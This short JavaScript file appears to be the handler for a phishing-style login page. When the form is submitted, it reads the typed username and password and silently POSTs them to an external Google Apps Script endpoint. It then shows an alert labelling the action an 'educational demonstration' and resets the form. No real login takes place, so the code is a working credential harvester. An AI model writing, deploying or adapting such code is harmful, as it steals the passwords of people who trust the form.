const form = document.getElementById("loginForm");

form.addEventListener("submit", function (e) {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    fetch("https://script.google.com/macros/s/AKfycbxfAPByykld75--6V5MH-mG3R-OIwQQX2KLxO6oiO_0eTMZtC9djBPPwHY6F-sbynTz/exec", {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify({
            username: username,
            password: password
        })
    });

    alert("Educational demonstration submitted.");

    form.reset();
});
